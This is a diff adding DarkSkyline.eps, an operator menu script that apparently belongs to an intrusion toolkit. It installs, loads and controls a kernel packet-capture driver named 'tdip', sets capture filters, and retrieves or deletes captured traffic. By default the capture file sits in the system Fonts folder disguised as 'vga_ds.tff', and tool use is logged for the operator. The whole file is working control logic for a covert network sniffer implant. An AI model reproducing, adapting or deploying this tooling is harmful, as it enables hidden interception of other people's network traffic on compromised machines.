@@ -1,0 +1,316 @@
+#--------------------------------------------------------
+# File: DarkSkyline.eps
+#
+# Wrapper script for DarkSkyline tools
+#
+# Modifications:
+#  11/26/2002	Created.
+#  05/03/2004	Updated to let user change capture file
+#--------------------------------------------------------
+@include "_RecordToolUse.epm";
+
+@echo off;
+
+# defaults
+string $driverName = "tdip";
+string $captureFile = "\\SystemRoot\\Fonts\\vga_ds.tff";
+string $version = "DarkSkyline 2.2.0.1";
+
+_RecordToolUse("DarkSkyline", $version);
+
+# commands
+int $installCmdsStart = 1;
+int $normalCmdsStart = 9;
+int $controlCmdsStart = 14;
+int $captureCmdsStart = 18;
+string $commands;
+$commands[0] = "Quit";
+
+# start of "install" commands
+$commands[1] = "Change driver name";
+$commands[2] = "Change capture file";
+$commands[3] = "Install tools";
+$commands[4] = "Uninstall tools";
+$commands[5] = "Load driver";
+$commands[6] = "Unload driver";
+$commands[7] = "Verify install";
+$commands[8] = "Verify driver is running";
+
+# start of "config" commands
+$commands[9] = "Get current status";
+$commands[10] = "Get packet filter";
+$commands[11] = "Set packet filter";
+$commands[12] = "Set max capture file size";
+$commands[13] = "Set the maximum packet size";
+
+# start of "control" commands
+$commands[14] = "Disable scanning";
+$commands[15] = "Enable scanning";
+$commands[16] = "Stop scanning";
+$commands[17] = "Start scanning";
+
+# start of "capture file" commands
+$commands[18] = "Retreive packet capture file";
+$commands[19] = "Delete packet capture file";
+$commands[20] = "Parse capture file";
+
+while (true) {
+    echo "\r\n\r\n";
+    echo "$version\r\n";
+
+    # Print the current configuration
+    echo "Current Configuration:";
+    echo "\t Driver Name : $driverName";
+    echo "\tCapture File : $captureFile";
+    echo "";
+
+    # print the command list
+    int $i=0;
+    while ($i < sizeof($commands)) {
+	if ($i == $installCmdsStart) {
+	    echo "";
+	    echo "Installation commands:";
+	} else if ($i == $normalCmdsStart) {
+	    echo "";
+	    echo "Configuration commands";
+	} else if ($i == $controlCmdsStart) {
+	    echo "";
+	    echo "Control commands:";
+	} else if ($i == $captureCmdsStart) {
+	    echo "";
+	    echo "Capture File commands:";
+	}
+	echo "($i). $commands[$i]";
+	$i++;
+    }
+
+    echo "";
+    int $choice = GetInput("Enter the desired option");
+    if ($choice == 0) {
+
+	# quit
+	return true;
+
+    } else if ($choice == 1) {
+
+	# Change driver name
+	echo "Current driver name = '$driverName'";
+	$driverName = GetInput("Enter new driver name");
+
+    } else if ($choice == 2) {
+
+	# Change capture file name
+	GetCaptureFile($captureFile);
+
+    } else if ($choice == 3) {
+
+	# install driver
+	if (`script DarkSkyline\\Install.eps $driverName "$captureFile"`) {
+	    echo "INSTALL SUCCESS";
+	    echo "";
+	    echo "NOTE: The driver has not been loaded";
+	} else {
+	    echo "**** INSTALL FAILED ****";
+	}
+
+    } else if ($choice == 4) {
+
+	# uinstall driver
+	if (`script DarkSkyline\\Uninstall.eps $driverName`) {
+	    echo "UNINSTALL SUCCESS";
+	    echo "";
+	    echo "**** NOTE: The capture file must be deleted seperately ****";
+	} else {
+	    echo "**** UNINSTALL FAILED ****";
+	}
+
+    } else if ($choice == 5) {
+
+	# load the driver
+	if (prompt "Load the driver ($driverName)?") {
+	    @echo on;
+	    `driverload -name $driverName`;
+	    @echo off;
+	}
+
+    } else if ($choice == 6) {
+
+	# unload the driver
+	if (prompt "Unload the driver ($driverName)?") {
+	    @echo on;
+	    `driverunload -name $driverName`;
+	    @echo off;
+	}
+
+    } else if ($choice == 7) {
+
+	# verify install
+	if (`script DarkSkyline\\VerifyInstall.eps $driverName`) {
+	    echo "VERIFICATION SUCCESSFULL";
+	} else {
+	    echo "**** UNABLE TO VERIFY INSTALL ****";
+	}
+
+    } else if ($choice == 8) {
+
+	# verify install
+	if (`script DarkSkyline\\VerifyRunning.eps $driverName`) {
+	    echo "VERIFICATION SUCCESSFUL";
+	} else {
+	    echo "**** UNABLE TO VERIFY DRIVER IS RUNNING ****";
+	}
+
+	### CONFIG COMMANDS ###
+
+    } else if ($choice == 9) {
+
+	# get the current status
+	`script DarkSkyline\\GetStatus.eps $driverName "$captureFile"`;
+
+    } else if ($choice == 10) {
+
+	# get the current filter
+	@echo on;
+	`packetscan -name $driverName -get`;
+	@echo off;
+
+    } else if ($choice == 11) {
+
+	# set the current filter
+	if (`script DarkSkyline\\SetFilter.eps $driverName`) {
+	    echo "SET OF FILTER SUCCESSFUL";
+	    echo "";
+	    echo "NOTE: Packet capturing has been STOPPED";
+	} else {
+	    echo "**** UNABLE TO SET NEW FILTER ****";
+	    echo "";
+	    echo "NOTE: The driver must be started before a filter may be set";
+	}
+
+    } else if ($choice == 12) {
+
+	# set the maximum capture file size
+	if (`script DarkSkyline\\SetMaxFileSize.eps $driverName`) {
+	    echo "SET OF MAX CAPTURE FILE SIZE SUCCESSFUL";
+	    echo "";
+	    echo "NOTE: Packet capturing must STOPPED and RESTARTED";
+	    echo "      for this change to take effect.";
+	} else {
+	    echo "**** UNABLE TO SET MAXIMUM CAPTURE FILE SIZE ****";
+	}
+
+    } else if ($choice == 13) {
+
+	# set the maximum packet size
+	if (`script DarkSkyline\\SetPacketSize.eps $driverName`) {
+	    echo "SET OF MAX PACKET SIZE SUCCESSFUL";
+	    echo "";
+	    echo "NOTE: Packet capturing must STOPPED and RESTARTED";
+	    echo "      for this change to take effect.";
+	} else {
+	    echo "**** UNABLE TO SET MAXIMUM PACKET SIZE ****";
+	}
+
+	### CONFIG COMMANDS ###
+
+	### CONTROL COMMANDS ###
+
+    } else if ($choice == 14) {
+
+	# disable scanning
+	@echo on;
+	`packetscan -name $driverName -control disable`;
+	@echo off;
+
+    } else if ($choice == 15) {
+
+	# enable scanning
+	@echo on;
+	`packetscan -name $driverName -control enable`;
+	@echo off;
+
+    } else if ($choice == 16) {
+
+	# stop scanning
+	@echo on;
+	`packetscan -name $driverName -control stop`;
+	@echo off;
+
+    } else if ($choice == 17) {
+
+	# start scanning
+	@echo on;
+	`packetscan -name $driverName -control start`;
+	@echo off;
+	
+	### CONTROL COMMANDS ###
+
+	### CAPTURE FILE COMMANDS ###
+
+    } else if ($choice == 18) {
+
+	# get packet capture file
+	if (`script DarkSkyline\\HandleCapture.eps $driverName get "$captureFile"`) {
+	    echo "GET OF CAPTURE FILE SUCCESSFUL";
+	} else {
+	    echo "**** UNABLE TO GET CAPTURE FILE ****";
+	    echo "";
+	    echo "NOTE: Capturing must be stopped before the file";
+	    echo "      can be retrieved";
+	}
+
+    } else if ($choice == 19) {
+
+	# get packet capture file
+	if (`script DarkSkyline\\HandleCapture.eps $driverName delete "$captureFile"`) {
+	    echo "DELETE OF CAPTURE FILE SUCCESSFUL";
+	} else {
+	    echo "**** UNABLE TO DELETE CAPTURE FILE ****";
+	    echo "";
+	    echo "NOTE: Capturing must be stopped before the file";
+	    echo "      can be deleted";
+	}
+
+    } else if ($choice == 20) {
+
+	# parse the capture file
+	if (`script DarkSkyline\\ParseCapture.eps`) {
+	    echo "PARSE OF CAPTURE FILE SUCCESSFUL";
+	} else {
+	    echo "**** UNABLE TO PARSE CAPTURE FILE ****";
+	}
+
+	### CAPTURE FILE COMMANDS ###
+
+    } else {
+	# invalid choice
+	echo "*** Invalid choice ***";
+    }
+
+    pause;
+}
+
+return true;
+
+#---------------------------------------------------------------------------
+Sub GetCaptureFile(REF string $captureFile)
+{
+
+    echo "Enter a new capture file in kernel-mode form:";
+    echo "   eg. '\\SystemRoot\\Fonts\\vga_ds.tff' or '\\??\\D:\\temp\\~fg34.tmp'";
+    while (true) {
+	# get the path -- making sure that it's at least in a valid form
+	$captureFile = GetInput("Enter a Capture File");
+	string $parts = Split("\\", $captureFile);
+	if ((sizeof($parts) < 3) || ($parts[0] != "") || (($parts[1] != "SystemRoot") && ($parts[1] != "??"))) {
+	    echo "* Invalid capture path";
+	} else {
+	    # good capture path
+	    break;
+	}
+    }
+
+    return true;
+
+}
+# end GetCaptureFile
